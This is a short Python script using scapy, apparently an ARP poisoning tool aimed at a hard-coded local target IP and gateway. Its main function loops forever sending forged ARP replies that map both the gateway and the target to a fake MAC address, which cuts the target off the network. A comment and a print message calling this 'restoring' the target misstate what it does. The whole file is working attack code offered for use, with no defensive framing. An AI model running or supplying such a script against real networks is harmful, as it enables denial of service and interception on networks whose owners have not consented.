from scapy.all import *
import os
import sys
import threading

interface = "enp8s0"
target_ip = "192.168.13.94"
gateway_ip = "192.168.13.253"
packet_count = 10000
poisoning = True

fake_mac = "00:00:00:00:00:1"

def destory_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print "[*] Restoring target..."
    #psrc = sender ip , pdst = target ip
    while True:
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=fake_mac), count=1)
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=fake_mac), count=1)
        time.sleep(5)

def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src

    return None

gateway_mac = get_mac(gateway_ip)
target_mac = get_mac(target_ip)


try:
    destory_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    pass

finally:
    sys.exit(0)
